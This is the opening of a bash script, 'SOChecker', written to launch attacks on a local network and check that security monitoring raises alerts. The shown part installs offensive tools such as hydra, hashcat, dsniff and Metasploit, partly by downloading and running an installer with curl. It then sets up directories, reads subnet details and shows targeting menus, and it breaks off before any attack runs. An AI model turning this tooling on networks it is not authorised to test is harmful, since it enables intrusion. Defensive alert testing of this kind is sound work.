#!/bin/bash
#Author: Elijah Oh
#Date Created: 08/11/2021
#This is a script that runs different cyber attacks in a given network to check if monitoring alerts appear.
#Date Modified: 04/12/2021

#lists of color codes for echo command output
Black='\033[0;30m' 
Red='\033[0;31m' 
Green='\033[0;32m' 
Orange='\033[0;33m' 
Blue='\033[0;34m' 
Purple='\033[0;35m' 
Cyan='\033[0;36m' 
Light_Gray='\033[0;37m' 
Dark_Gray='\033[1;30m' 
Light_Red='\033[1;31m' 
Light_Green='\033[1;32m' 
Yellow='\033[1;33m' 
Light_Blue='\033[1;34m' 
Light_Purple='\033[1;35m' 
Light_Cyan='\033[1;36m' 
White='\033[1;37m' 
Slant_Purple='\e[1;35;3m'
NC='\033[0m' # No Color 

#trap command to capture exit signals
trap 'echo -e "\n${Light_Red}[!]${NC} Exiting Program..."; PROGRAM_TERMINATED; exit 130' EXIT #SIGINT

#display the script banner to the user
function BANNER {
echo
echo -e "${Light_Cyan}   _____ ____  ________              __            ${NC}"
echo -e "${Light_Cyan}  / ___// __ \/ ____/ /_  ___  _____/ /_____  _____${NC}"
echo -e "${Light_Cyan}  \__ \/ / / / /   / __ \/ ${Light_Red}_${NC} ${Light_Cyan}\/ ___/ //_/${NC} ${Light_Red}_${NC} ${Light_Cyan}\/ ___/${NC}"
echo -e "${Light_Cyan} ___/ / /_/ / /___/ / / /  __/ /__/ ,< /  __/ /    ${NC}"
echo -e "${Light_Cyan}/____/\____/\____/_/ /_/\___/\___/_/|_|\___/_/     ${NC}"
echo -e "${Slant_Purple}                         Welcome to SOChecker${NC}"
}

#convert subnetmask to CIDR notations
#credits: https://www.linuxquestions.org/questions/programming-9/bash-cidr-calculator-646701/
function CIDR {
    nbits=0
    IFS=.
    for dec in $1 ; do
        case $dec in
            255) let nbits+=8;;
            254) let nbits+=7;;
            252) let nbits+=6;;
            248) let nbits+=5;;
            240) let nbits+=4;;
            224) let nbits+=3;;
            192) let nbits+=2;;
            128) let nbits+=1;;
            0);;
            *) echo "Error: $dec is not recognised"; exit 1
        esac
    done
    echo "$nbits"
}

#validate if user is root
function ROOT_VALIDATION {
	#the script will prompt the instructions to the user if the user is not root
	if [ $(echo $USER) != "root" ]; then
		echo -e "\n${Light_Red}[!]${NC} Please switch to user ${Orange}root${NC} and run the script again."
		echo -e "${Light_Purple}[*]${NC} To switch to root, execute the command: ${Orange}sudo -i${NC}"
		echo -e "${Light_Purple}[*]${NC} Next, execute this command: bash $PWD/$0"
		exit 1
	fi
}

PACKAGES=(arp-scan nmap masscan locate wireshark xterm xfreerdp msfconsole hashcat firefox xsltproc hydra dsniff)
MISSING_PACKAGES=()

#validate if the require packages are installed
function CHECK_PACKAGES {
	echo -e "\n${Light_Purple}[-]${NC} Setting up $0 script. Please be patient...\n"
	for package in ${PACKAGES[@]}
	do
		#validate if package is installed and assign it to $PACKAGE_EXIST
		PACKAGE_EXIST=$(which $package)
		#validate if $PACKAGE_EXIST is empty, add missing package to $MISSING_PACKAGES
		if [ -z "$PACKAGE_EXIST" ]; then
			echo -e "${Light_Red}[!]${NC} ${Cyan}$package${NC} package: ${Light_Red}Not installed${NC}."
			MISSING_PACKAGES+=($package)
		else
			echo -e "${Light_Purple}[*]${NC} ${Cyan}$package${NC} package: ${Green}Installed${NC}."
		fi
	done 
	#validate if $MISSING_PACKAGES is not empty, run apt-get update if it is not empty
	if [ ! -z "$MISSING_PACKAGES" ]; then
	echo
	sudo apt-get update
	echo
	fi
}

#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
function VALIDATE_PACKAGE {
	MPACKAGE=$1
	MPACKAGE_EXIST=$(which $MPACKAGE)
}

#install the missing requires packages
function INSTALL_PACKAGES {
	for missing_package in ${MISSING_PACKAGES[@]}; 
	do
		case ${missing_package} in
			arp-scan) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes arp-scan -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			nmap) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes nmap -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			masscan) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes masscan -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			locate) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes mlocate -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			wireshark) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes wireshark -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			xterm) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes xterm -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			xfreerdp) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes freerdp2-x11 -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			msfconsole) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			hashcat) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes hashcat -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			firefox) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes firefox-esr -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			xsltproc) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes xsltproc -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			hydra) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes hydra -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
			dsniff) 
				echo -e "\n${Light_Purple}[-]${NC} Installing ${Cyan}$missing_package${NC}...\n"
				sudo apt-get install --assume-yes dsniff -y
				#valiate if missing package is installed successfully, takes in 1 argument $1, returns $MPACKAGE_ERR_CODE
				VALIDATE_PACKAGE $missing_package
				if [ ! -z "$MPACKAGE_EXIST" ]; then
					echo -e "\n${Light_Purple}[*]${NC} ${Cyan}$missing_package${NC} installed successfully."
				else 
					echo -e "\n${Light_Red}[!]${NC} ${Cyan}$missing_package${NC} installation was not successful. Please run $0 again."
					exit
				fi
				;;
		esac
	done
}

#setup the main folder to store files generated by the script
function MAIN_DIR_SETUP {
	echo -e "\n${Light_Purple}[-]${NC} Setting up directories. Please be patient..."
	MAIN_DIR="SOChecker_dir"
	#change directory
	cd ~
	#validate if $MAIN_DIR directory exists
	#create $MAIN_DIR dirirectory and assign path to a variable
	if [ ! -d "$MAIN_DIR" ]; then
		mkdir $MAIN_DIR
		sudo updatedb
		MAIN_DIR_PATH=$(sudo locate $MAIN_DIR | grep -E $(echo $MAIN_DIR)$)
	else
		sudo updatedb
		MAIN_DIR_PATH=$(sudo locate $MAIN_DIR | grep -E $(echo $MAIN_DIR)$)
	fi
	#setup the session folder to store logs generated by the script
	SESSION_DIR_SETUP
	#setup the Local Area Network (LAN) folder to store info generated by the script
	LAN_DIR_SETUP
	#setup the ARP folder to store info generated by the script
	ARP_DIR_SETUP
	#setup the masscan folder and save the results generated by the script
	MASSCAN_DIR_SETUP
	#setup the nmap folder and save the results generated by the script
	NMAP_DIR_SETUP
	#setup the Kerberos folder to store info generated by the script
	KERBEROS_DIR_SETUP
	#setup the remote desktop protocol (RDP) folder to store info generated by the script
	RDP_DIR_SETUP
	#setup the msfconsole payload folder to store info generated by the script
	MSFCONSOLE_DIR_SETUP
	#setup the SSH folder to store info generated by the script
	SSH_DIR_SETUP
}

#setup the Local Area Network (LAN) folder to store info generated by the script
function LAN_DIR_SETUP {
	LAN_DIR="lan_dir"
	#change to $MAIN_DIR directory
	cd ~/$MAIN_DIR
	#validate if $LAN_DIR directory exists
	#create $LAN_DIR dirirectory and assign path to a variable
	if [ ! -d "$LAN_DIR" ]; then
		mkdir $LAN_DIR
		sudo updatedb
		LAN_DIR_PATH=$(sudo locate $LAN_DIR | grep -E $(echo $LAN_DIR)$)
	else
		sudo updatedb
		LAN_DIR_PATH=$(sudo locate $LAN_DIR | grep -E $(echo $LAN_DIR)$)
	fi
}

#setup the msfconsole payload folder to store info generated by the script
function MSFCONSOLE_DIR_SETUP {
	MSFCONSOLE_DIR="msfconsole_dir"
	#change to $MAIN_DIR directory
	cd ~/$MAIN_DIR
	#validate if $MSFCONSOLE_DIR directory exists
	#create $MSFCONSOLE_DIR dirirectory and assign path to a variable
	if [ ! -d "$MSFCONSOLE_DIR" ]; then
		mkdir $MSFCONSOLE_DIR
		sudo updatedb
		MSFCONSOLE_DIR_PATH=$(sudo locate $MSFCONSOLE_DIR | grep -E $(echo $MSFCONSOLE_DIR)$)
	else
		sudo updatedb
		MSFCONSOLE_DIR_PATH=$(sudo locate $MSFCONSOLE_DIR | grep -E $(echo $MSFCONSOLE_DIR)$)
	fi
}
#setup the session folder to store logs generated by the script
function SESSION_DIR_SETUP {
	SESSION_DIR="session_dir"
	#change to $MAIN_DIR directory
	cd ~/$MAIN_DIR
	#validate if $SESSION_DIR directory exists
	#create $SESSION_DIR dirirectory and assign path to a variable
	if [ ! -d "$SESSION_DIR" ]; then
		mkdir $SESSION_DIR
		sudo updatedb
		SESSION_DIR_PATH=$(sudo locate $SESSION_DIR | grep -E $(echo $SESSION_DIR)$)
	else
		sudo updatedb
		SESSION_DIR_PATH=$(sudo locate $SESSION_DIR | grep -E $(echo $SESSION_DIR)$)
	fi
}

#setup the ARP folder to store info generated by the script
function ARP_DIR_SETUP {
	ARP_DIR="arp_dir"
	#change to $MAIN_DIR/$LAN_DIR directory
	cd ~/$MAIN_DIR/$LAN_DIR
	#validate if $ARP_DIR directory exists
	#create $ARP_DIR dirirectory and assign path to a variable
	if [ ! -d "$ARP_DIR" ]; then
		mkdir $ARP_DIR
		sudo updatedb
		ARP_DIR_PATH=$(sudo locate $ARP_DIR | grep -E $(echo $ARP_DIR)$)
	else
		sudo updatedb
		ARP_DIR_PATH=$(sudo locate $ARP_DIR | grep -E $(echo $ARP_DIR)$)
	fi
}

#setup the masscan folder and save the results generated by the script
function MASSCAN_DIR_SETUP {
	MASSCAN_DIR="masscan_dir"
	#change to $MAIN_DIR/$LAN_DIR directory
	cd ~/$MAIN_DIR/$LAN_DIR
	#validate if $MASSCAN_DIR directory exists
	#create $MASSCAN_DIR dirirectory and assign path to a variable
	if [ ! -d "$MASSCAN_DIR" ]; then
		mkdir $MASSCAN_DIR
		sudo updatedb
		MASSCAN_DIR_PATH=$(sudo locate $MASSCAN_DIR | grep -E $(echo $MASSCAN_DIR)$)
	else
		sudo updatedb
		MASSCAN_DIR_PATH=$(sudo locate $MASSCAN_DIR | grep -E $(echo $MASSCAN_DIR)$)
	fi
}

#setup the nmap folder and save the results generated by the script
function NMAP_DIR_SETUP {
	NMAP_DIR="nmap_dir"
	#change to $MAIN_DIR/$LAN_DIR directory
	cd ~/$MAIN_DIR/$LAN_DIR
	#validate if $NMAP_DIR directory exists
	#create $NMAP_DIR dirirectory and assign path to a variable
	if [ ! -d "$NMAP_DIR" ]; then
		mkdir $NMAP_DIR
		sudo updatedb
		NMAP_DIR_PATH=$(sudo locate $NMAP_DIR | grep -E $(echo $NMAP_DIR)$)
	else
		sudo updatedb
		NMAP_DIR_PATH=$(sudo locate $NMAP_DIR | grep -E $(echo $NMAP_DIR)$)
	fi
}

#setup the Kerberos folder to store info generated by the script
function KERBEROS_DIR_SETUP {
	KERBEROS_DIR="kerberos_dir"
	#change to $MAIN_DIR/$LAN_DIR directory
	cd ~/$MAIN_DIR/$LAN_DIR
	#validate if $KERBEROS_DIR directory exists
	#create $KERBEROS_DIR dirirectory and assign path to a variable
	if [ ! -d "$KERBEROS_DIR" ]; then
		mkdir $KERBEROS_DIR
		sudo updatedb
		KERBEROS_DIR_PATH=$(sudo locate $KERBEROS_DIR | grep -E $(echo $KERBEROS_DIR)$)
	else
		sudo updatedb
		KERBEROS_DIR_PATH=$(sudo locate $KERBEROS_DIR | grep -E $(echo $KERBEROS_DIR)$)
	fi
}

#setup the SSH folder to store info generated by the script
function SSH_DIR_SETUP {
	SSH_DIR="ssh_dir"
	#change to $MAIN_DIR/$LAN_DIR directory
	cd ~/$MAIN_DIR/$LAN_DIR
	#validate if $SSH_DIR directory exists
	#create $SSH_DIR dirirectory and assign path to a variable
	if [ ! -d "$SSH_DIR" ]; then
		mkdir $SSH_DIR
		sudo updatedb
		SSH_DIR_PATH=$(sudo locate $SSH_DIR | grep -E $(echo $SSH_DIR)$)
	else
		sudo updatedb
		SSH_DIR_PATH=$(sudo locate $SSH_DIR | grep -E $(echo $SSH_DIR)$)
	fi
}

#setup the remote desktop protocol (RDP) folder to store info generated by the script
function RDP_DIR_SETUP {
	RDP_DIR="rdp_dir"
	#change to $MAIN_DIR/$LAN_DIR directory
	cd ~/$MAIN_DIR/$LAN_DIR
	#validate if $RDP_DIR directory exists
	#create $RDP_DIR dirirectory and assign path to a variable
	if [ ! -d "$RDP_DIR" ]; then
		mkdir $RDP_DIR
		sudo updatedb
		RDP_DIR_PATH=$(sudo locate $RDP_DIR | grep -E $(echo $RDP_DIR)$)
	else
		sudo updatedb
		RDP_DIR_PATH=$(sudo locate $RDP_DIR | grep -E $(echo $RDP_DIR)$)
	fi
}

#fetch subnetwork information from system 
function GET_SUBNETWORK {
	#assign varibale to detect if there is network connectivity, default value is 0
	NETWORK_CONNECT=0
	#assign variable for current UTC date time for the current session
	DATETIME_UTC_CURRENT=$(date -u +"%F %H:%M:%S")
	SESSION_ID=$(date -u +"D%FT%H:%M:%SZ")
	#assign host ip to variable
	HOST_IP=$(hostname -I | awk -F " " '{print $1}')
	#assign subnetwork and subnet mask to variables
	SUBNETWORK=$(route -n | grep -w U | grep -i eth0 | awk -F " " '{print $1}' | head -n 1)
	SUBNET_MASK=$(route -n | grep -w U | grep -i eth0 | awk -F " " '{print $3}' | head -n 1)
	CIDR_SUBNETM=$(CIDR $SUBNET_MASK)
	CIDR_FASTSCAN=24
	SUBNET_WM=$(echo $SUBNETWORK)/$(echo $CIDR_SUBNETM)
	DEFAULT_GATEWAY=$(route -n | grep UG | awk -F " " '{print $2}')
	DEFAULT_GATEWAY_MAC=$(arp-scan $DEFAULT_GATEWAY | grep $(echo $DEFAULT_GATEWAY) | awk '{print $2}')
	#validate if $HOST_IP is not empty
	if [ ! -z "$HOST_IP" ]; then
		#change directory to $SESSION_DIR_PATH
		cd $SESSION_DIR_PATH
		#validates if user chooses to fetch subnetwork information again from the MAIN_MENU
		if [[ "$FETCH_AGAIN" -ne 1 ]]; then
			#assign session filename to a variable
			SESSION_ID_FILENAME=$SESSION_ID.log
			#save $SESSION_ID to a file
			echo "#session $(echo $SESSION_ID)" > $SESSION_ID_FILENAME
			echo | tee -a $SESSION_ID_FILENAME
			echo -e "--------------------------------------" | tee -a $SESSION_ID_FILENAME
			echo -e "${White}Local Area Network (L.A.N) Information${NC}" | tee -a $SESSION_ID_FILENAME
			echo -e "--------------------------------------" | tee -a $SESSION_ID_FILENAME
			echo -e "Current Date/Time: $(echo $DATETIME_UTC_CURRENT) UTC" | tee -a $SESSION_ID_FILENAME
		fi
		#validates if user chooses to fetch subnetwork information again from the MAIN_MENU
		if [[ "$FETCH_AGAIN" -eq 1 ]]; then
			#save event to a file
			echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" | tee -a $SESSION_ID_FILENAME
			echo -e "${Light_Purple}Fetch L.A.N information${NC}" >> $SESSION_ID_FILENAME
		fi
		echo -e "Host IP Address: $(echo $HOST_IP)" | tee -a $SESSION_ID_FILENAME
		echo -e "Default Gateway: $DEFAULT_GATEWAY" | tee -a $SESSION_ID_FILENAME
		echo -e "Subnetwork: $(echo $SUBNETWORK)" | tee -a $SESSION_ID_FILENAME
		echo -e "Subnet Mask: $(echo $SUBNET_MASK)" | tee -a $SESSION_ID_FILENAME
		echo -e "CIDR Subnet Mask: /$(echo $CIDR_SUBNETM)" | tee -a $SESSION_ID_FILENAME
	else
		echo -e "\n${Light_Red}[!]${NC} Please check your network settings and run $0 again."
		#assigns value of 1 to $NETWORK_CONNECT when $HOST_IP is empty
		NETWORK_CONNECT=1
		exit
	fi
}


#display output to user that the program has been terminated
function PROGRAM_TERMINATED {
	#assign session filename to a variable
	SESSION_ID_FILENAME=$SESSION_ID.log
	#disallow root to execute firefox
	XAUTHORITY_REMOVE
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	#validate if user is root, save session info if user is root
	if [ $(echo $USER) == "root" ]; then
		echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
		echo -e "${Light_Purple}Program Terminated${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#output the latest session file and checks if the user would like to remove the files generatated by the script
	RM_SCRIPT_FILES
	fi
	echo -e "\n${Light_Purple}[*]${NC} Program Terminated."
}
	
#presents to user the main menu to choose a single target or to scan for a local area network
function MAIN_MENU {
	#assign variable for NMAP status, default value is 0
	NMAP_STATUS=0
	#validates if there is network connectivity, default value is 0
	if [ "$NETWORK_CONNECT" -eq 0 ]; then
		echo
		echo -e "${Light_Purple}---------${NC}"
		echo -e "${White}MAIN MENU${NC}"
		echo -e "${Light_Purple}---------${NC}"
		echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} Scan ${Green}$SUBNETWORK${NC} L.A.N For Available Host(s)"
		echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} Scan A ${Cyan}Single${NC} L.A.N IP Address"
		echo -e "${Light_Purple}[${Orange}F${NC}${Light_Purple}]${NC} ${Orange}F${NC}etch Local Area Network Information Again"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		echo -e "${Light_Purple}---------${NC}"
		#assign checker variable for network or single scan
		NETWORK_TARGET_CHECKER=0
		SINGLE_TARGET_CHECKER=0
		#assign main menu checker variable for while loop
		MAIN_MENU_CHECKER=0
		while [ "$MAIN_MENU_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Please select '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}F${NC}' or '${Orange}Q${NC}': "
			read MAIN_MENU_CHOICE
			case $MAIN_MENU_CHOICE in
				1 )
				#assign variable for scan network settings
				NETWORK_TARGET_CHECKER=1
				#get user input for the LAN IP address to inspect
				LAN_IP_MENU
				MAIN_MENU_CHECKER=1
				shift
				;;
				2 )
				#assign variable for scan single target
				SINGLE_TARGET_CHECKER=1
				#get user input for the LAN IP address to inspect
				LAN_IP_MENU
				MAIN_MENU_CHECKER=1
				shift
				;;
				f | F | fetch | Fetch | FETCH )
				#assign variable when user chooses to fetch subnetwork settings again
				FETCH_AGAIN=1
				#fetch subnetwork information from system 
				GET_SUBNETWORK
				#reset checker variables to 0 before returning to the main menu
				SINGLE_TARGET_CHECKER=0
				NETWORK_TARGET_CHECKER=0
				#presents to user the main menu to choose a single target or to scan for a local area network
				MAIN_MENU
				MAIN_MENU_CHECKER=1
				shift
				;;
				q | Q | quit | Quit | QUIT )
				exit
				shift
				;;
				* )
				echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
				shift
				;;
			esac
		done
	else
		echo -e "\n${Light_Red}[!]${NC} Please check your network settings and run $0 again."
		exit
	fi
}

#get user input for the LAN IP address to inspect
function LAN_IP_MENU { 
	#get the first octet of LAN's IP address
	IP_1ST_OCT=$(echo $SUBNETWORK | awk -F "." '{print $1}')
	#assign checker variable for while loop
	LANIP_TARGET_CHECKER=0
	while [ "$LANIP_TARGET_CHECKER" -eq 0 ]
	do
		#validate if user selected network scan
		if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
			echo -e "\n${Light_Purple}[${NC}${Orange}R${NC}${Light_Purple}]${NC} ${Yellow}R${NC}eturn back to previous options "
			echo -e -n "${Yellow}[?]${NC} Enter the IP to scan for host(s) within ${Green}$SUBNETWORK${NC} subnetwork: "
		fi
		#validate if user selected single target scan
		if [ "$SINGLE_TARGET_CHECKER" -eq 1 ]; then
			echo -e "\n${Light_Purple}[${NC}${Orange}R${NC}${Light_Purple}]${NC} ${Yellow}R${NC}eturn back to previous options "
			echo -e -n "${Yellow}[?]${NC} Enter a ${Cyan}single${NC} host IP address within ${Green}$SUBNETWORK${NC} subnetwork to be scanned: "
		fi
		read LAN_IP_TARGET
		#validate if $LAN_IP_TARGET is empty
		if [ -z "$LAN_IP_TARGET" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again or enter '${Orange}R${NC}' to ${Orange}R${NC}eturn to ${Cyan}Main Menu${NC}."
		elif [ "$LAN_IP_TARGET" == "R" ] || [ "$LAN_IP_TARGET" == "r" ]; then
			#reset checker variables to 0 before returning to the main menu
			SINGLE_TARGET_CHECKER=0
			NETWORK_TARGET_CHECKER=0
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			LANIP_TARGET_CHECKER=1
		elif [[ "$LAN_IP_TARGET" =~ ^$(echo $IP_1ST_OCT)\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
			#validate if user selected network scan
			if [[ "$ARP_RECORD_CHECKER" -eq 2 ]] || [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then 
				#allows user to choose if he/she wants to use the previously saved data
				ARP_HISTORY
				#validate if user selected network scan
				if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]] && [[ "$NMAP_TARGET_OPTIONS_CHECKER" -ne 1 ]]; then
					#allows user to choose the CIDR notation
					CHOOSE_CIDR
				fi
			fi
			#validate if user selected single target scan
			if [ "$SINGLE_TARGET_CHECKER" -eq 1 ] && [ "$NMAP_STATUS" -ne 1 ]; then 
				#present the scan/attack menu to the user
				ATTACK_MENU
			fi
			#validate if user selected single target scan and if $NMAP_STATUS value is 1
			if [ "$SINGLE_TARGET_CHECKER" -eq 1 ] && [ "$NMAP_STATUS" -eq 1 ]; then 
				#allows user to choose if he/she wants to import masscan saved data
				NMAP_IMPORT_MASSCAN_HISTORY
				#allows user to choose if he/she wants to import nmap saved data
				NMAP_HISTORY_OPTIONS
				#allow user to choose nmap port range
				NMAP_SELECT_PORTS
			fi
			LANIP_TARGET_CHECKER=1
		else
			echo -e "\n${Light_Red}[!]${NC} Please enter an IP within ${Green}$SUBNETWORK${NC} subnetwork or enter '${Orange}R${NC}' to ${Orange}R${NC}eturn to ${Cyan}Main Menu${NC}"
		fi
	done
}

#allows user to choose the CIDR notation 
function CHOOSE_CIDR {
	echo
	echo -e "${Light_Purple}--------------${NC}"
	echo -e "${White}CIDR SELECTION${NC}"
	echo -e "${Light_Purple}--------------${NC}"
	echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} /24"
	echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} /16"
	echo -e "${Light_Purple}[${Orange}3${NC}${Light_Purple}]${NC} /8"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Previous Options"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}--------------${NC}"
	#assign checker variable for while loop
	CIDR_TARGET_CHECKER=0
	while [ "$CIDR_TARGET_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Enter '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}3${NC}', '${Orange}R${NC}' or '${Orange}Q${NC}': "
		read CIDR_TARGET
		case $CIDR_TARGET in 
			1) 
			CIDR_TARGET="/24"
			echo -e "${Light_Purple}[*]${NC} Performing scans on ${Green}$(echo $LAN_IP_TARGET)${NC}${Cyan}$(echo $CIDR_TARGET)${NC} (256 Hosts)."
			#gets user to confirm selection for choice of CIDR $CIDR_CONFIRM
			CIDR_USER_CONFIRM $CIDR_TARGET
			CIDR_TARGET_CHECKER=1
			shift
			;;
			2)
			CIDR_TARGET="/16"
			echo -e "${Light_Purple}[*]${NC} Performing scans on ${Green}$(echo $LAN_IP_TARGET)${NC}${Cyan}$(echo $CIDR_TARGET)${NC} (65536 Hosts) will be slow."
			#gets user to confirm selection for choice of CIDR $CIDR_CONFIRM
			CIDR_USER_CONFIRM $CIDR_TARGET
			CIDR_TARGET_CHECKER=1
			shift
			;;
			3)
			CIDR_TARGET="/8"
